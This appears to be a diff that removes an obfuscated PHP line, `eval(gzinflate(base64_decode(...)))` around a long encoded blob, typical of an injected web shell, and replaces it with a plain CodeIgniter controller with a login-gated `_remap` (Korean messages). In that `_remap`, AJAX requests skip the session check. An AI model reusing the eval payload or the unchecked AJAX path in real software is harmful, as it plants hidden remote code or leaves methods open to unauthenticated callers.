@@ -1,1 +1,62 @@
-<?php eval(gzinflate(base64_decode('DdNFEqtaAgDQ5fz3isHFpX71AElwhyCTLuwCwQm++u6zh1MdWf+nftoR9tlW/cmzX0WT/y2rYiqrP//A1FPWZUt4PopRgBh89fKNYeXqsBsSpk54yozwyD3vXKJhbzjV+Vb0Bv8sWxswfYlhoZNq0XHpKB7VSwzuZPs96gbhEwnG4z9e8XP0ndbpt2hrch8VaWZ/pjq5rngxf2q3lkkclXCsznYhK15aENRYa0Fw0N6cbW89nZcgIwJZn1h6UWbY11C25pZ0WWSn79Jo1VMYwpg9KsuoRhRFL1EmAlktFa3B+7ZQV6BVF7F6oix+1eWNG458NU/nSqjvcwJZrMf10jp/YYQi61GZpl7Qya2EncPcjPnACfw3OERbbMVnFZQ2AXoypmbHqmiYyhP76dw8k5feNZoew0XAjjZMVnbC02IitxijShUvdgDBeO7JbC/dtnOPPxQBYVzeuYB9NpwxH+KCtCC5CnoXlM0sMr9HxoBEoW9ROdm3DoZxvadZJz+p5Dq0pDUyOQqPzUooGVW+/T2ibRkjwA99We4+ruxy2rKj6zKPydy0f7ZItrJKlgwp+4oZ3G4NBoVe3wqRM9PLEafFKjACHoKGRdhbfA0qWqjPbqNWSw+Ydm0JwBHO525pPwc9gfVgfmNfMs2l1abz6VcDJ2uQk30LpuaLRHOzbUvc1YYMqSAZNGh8MWmLM01mSg9mGV4RUlLPWDRE34OusFq9a6xP6YX/RaKm4Y0cZoj5cV3RU8gJqrmLcGu+u/2sYysiCh/MDQy5t7GTMDgOR/0YNL7u4kqOMGNOUFPVjjEzejiz6MfdrPl5HRPyDbRKhoS+Spf2PujQ0lfOs/0rni2azwdUbH4urk6js/BzSZW6RenqEmGqVQ00O5LXb+kfqkeUTm6YyXBNKZ7gVZvzxrZNxZnmxUujuqPK3ForgxXYuiVnlGYUWspQ9jBQJ9E9qncr39IFm1T5dmZ7fpOpcy13khS7and+hIIhC1xqOPf8/ODlhOdz5ObAUmmVMcwl0nX4TvnQH3FFQG5Wlaxbv549om04zIEQuK8QXSEWFMpBAUa36sPTl81Boa7qox5dKdj2WW6AnNGuN4p3MebPG+8DK7CkNHy2jFVrhJh/9YC7BoGn+sgVupi9WCK21Zs0sBMUDsFp8ZoTBfX5+INGPOHQ0tebr0hTvZ+W+Jzq1WA/DIoNNqS+SfdE2uPT2EtAeInCzKQjwyEAMFwJZCDGow9Cs63kciC41I+rLBW/2XKQzGYzs1M6+Yf9Tqn40gl78okl6e60ALaLc99PcML4V2hTZJOU0f0I5MjGswTo9HsPfqktNZfPEsL2qgo///+0q6nHQyLzL3OG61fn1LX+YE3ag6aw/G5qlJ0BsHOQD/uff/7+/fvv/wA=')));
+<?php
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+class Main extends CI_Controller {
+
+	public $data;
+
+	public function __construct()
+	{
+		parent::__construct();
+
+		$this->data['pos'] = $this->uri->segment(1);
+        $this->data['subpos'] = $this->uri->segment(2);
+		
+		$this->load->model('act_model');
+
+		$this->data['siteTitle'] = $this->config->item('site_title');
+
+		
+
+	}
+
+	public function _remap($method, $params = array())
+	{
+		if($this->input->is_ajax_request()){
+            if( method_exists($this, $method) ){
+                call_user_func_array(array($this,$method), $params);
+            }
+        }else{ //ajax가 아니면
+			
+			if (method_exists($this, $method)) {
+
+				$user_id = $this->session->userdata('user_id');
+				if(isset($user_id) && $user_id != ""){
+					
+					$this->load->view('/layout/header',$this->data);
+					call_user_func_array(array($this,$method), $params);
+					$this->load->view('/layout/tail');
+
+				}else{
+
+					alert('로그인이 필요합니다.',base_url('register/login'));
+
+				}
+
+            } else {
+                show_404();
+            }
+
+        }
+		
+	}
+
+
+	public function index()
+	{
+		$data['title'] = "인트로";
+		$this->load->view('intro',$data);
+	}
+
+
+}
